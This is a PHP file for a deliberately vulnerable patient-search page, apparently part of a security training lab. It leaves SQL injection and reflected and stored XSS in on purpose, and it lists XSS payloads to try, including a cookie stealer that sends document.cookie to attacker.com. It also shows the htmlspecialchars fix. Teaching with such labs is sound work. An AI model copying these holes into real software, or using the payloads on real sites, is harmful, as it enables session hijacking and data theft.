<?php
// VULNERABLE SEARCH PAGE - XSS VULNERABILITY
// WARNING: FOR TRAINING PURPOSES ONLY - DO NOT USE IN PRODUCTION

session_start();
include("config-vulnerable.php");

// Vulnerable: Display all errors
error_reporting(E_ALL);
ini_set('display_errors', 1);

$search_results = array();
$search_term = "";

if(isset($_GET['search'])) {
    // VULNERABILITY #1: No input sanitization
    $search_term = $_GET['search'];
    
    // VULNERABILITY #2: SQL Injection in search
    $query = "SELECT * FROM users WHERE fullname LIKE '%".$search_term."%' OR email LIKE '%".$search_term."%'";
    
    $result = mysqli_query($con, $query);
    
    if($result) {
        while($row = mysqli_fetch_assoc($result)) {
            $search_results[] = $row;
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Vulnerable Search - XSS Training</title>
    <meta charset="utf-8">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
    <style>
        .warning-banner {
            background: #ff0000;
            color: white;
            padding: 15px;
            text-align: center;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .vulnerability-info {
            background: #fff3cd;
            border: 2px solid #ffc107;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
        .search-result {
            border: 1px solid #ddd;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="warning-banner">
        WARNING: VULNERABLE VERSION - FOR SECURITY TRAINING ONLY WARNING:
    </div>
    
    <div class="container">
        <div class="row">
            <div class="col-md-8 offset-md-2">
                <div class="vulnerability-info">
                    <h5>TARGET: Training Target: Cross-Site Scripting (XSS)</h5>
                    <p><strong>Vulnerabilities Present:</strong></p>
                    <ul>
                        <li>Reflected XSS in search results</li>
                        <li>No output encoding/escaping</li>
                        <li>No input sanitization</li>
                        <li>SQL Injection in search query</li>
                        <li>No Content Security Policy (CSP)</li>
                    </ul>
                    <p><strong>Try:</strong> <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
                </div>

                <div class="card">
                    <div class="card-header">
                        <h3>Patient Search (Vulnerable)</h3>
                    </div>
                    <div class="card-body">
                        <form method="get" action="">
                            <div class="input-group mb-3">
                                <input type="text" class="form-control" name="search" 
                                       placeholder="Search patients by name or email..."
                                       value="<?php echo $search_term; ?>">
                                <div class="input-group-append">
                                    <button class="btn btn-primary" type="submit">Search</button>
                                </div>
                            </div>
                            <small class="form-text text-muted">
                                Try XSS payloads: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> or 
                                <code>&lt;img src=x onerror=alert('XSS')&gt;</code>
                            </small>
                        </form>
                        
                        <?php if(isset($_GET['search'])): ?>
                            <hr>
                            <h5>Search Results for: 
                                <?php 
                                // VULNERABILITY #3: REFLECTED XSS - Not encoding output
                                echo $search_term; 
                                ?>
                            </h5>
                            
                            <?php if(count($search_results) > 0): ?>
                                <?php foreach($search_results as $result): ?>
                                    <div class="search-result">
                                        <h6>
                                            <?php 
                                            // VULNERABILITY #4: STORED XSS - Not encoding database output
                                            echo $result['fullname']; 
                                            ?>
                                        </h6>
                                        <p>Email: <?php echo $result['email']; ?></p>
                                        <p>ID: <?php echo $result['id']; ?></p>
                                    </div>
                                <?php endforeach; ?>
                            <?php else: ?>
                                <div class="alert alert-info">
                                    No results found for: <?php echo $search_term; ?>
                                </div>
                            <?php endif; ?>
                        <?php endif; ?>
                        
                        <div class="mt-3">
                            <a href="user-login-sqli.php">← Back to Login</a>
                        </div>
                    </div>
                </div>
                
                <div class="vulnerability-info mt-3">
                    <h6>TIP: Learning Points:</h6>
                    <ol>
                        <li><strong>Reflected XSS:</strong> User input is immediately displayed without encoding</li>
                        <li><strong>Stored XSS:</strong> Database content is displayed without encoding</li>
                        <li><strong>No sanitization:</strong> Any HTML/JavaScript is executed</li>
                        <li><strong>Multiple injection points:</strong> Search term, results, error messages</li>
                    </ol>
                    
                    <h6>SEARCH: XSS Payloads to Try:</h6>
                    <pre>Basic: &lt;script&gt;alert('XSS')&lt;/script&gt;

Image: &lt;img src=x onerror=alert('XSS')&gt;

Cookie Stealer: &lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;

DOM: &lt;img src=x onerror=alert(document.domain)&gt;

Event Handler: &lt;body onload=alert('XSS')&gt;

SVG: &lt;svg/onload=alert('XSS')&gt;

Iframe: &lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</pre>
                    
                    <h6>FIX: How to Fix:</h6>
                    <pre>// Instead of: echo $search_term;
// Use: echo htmlspecialchars($search_term, ENT_QUOTES, 'UTF-8');</pre>
                </div>

                <div class="vulnerability-info mt-3">
                    <h6>WARNING: Real-World Impact:</h6>
                    <ul>
                        <li>Session hijacking via cookie theft</li>
                        <li>Keylogging and credential theft</li>
                        <li>Phishing attacks</li>
                        <li>Malware distribution</li>
                        <li>Website defacement</li>
                        <li>Cryptocurrency mining scripts</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        // VULNERABILITY #5: No XSS protection in JavaScript
        var searchTerm = "<?php echo $search_term; ?>";
        console.log("Searched for: " + searchTerm);
    </script>
</body>
</html>
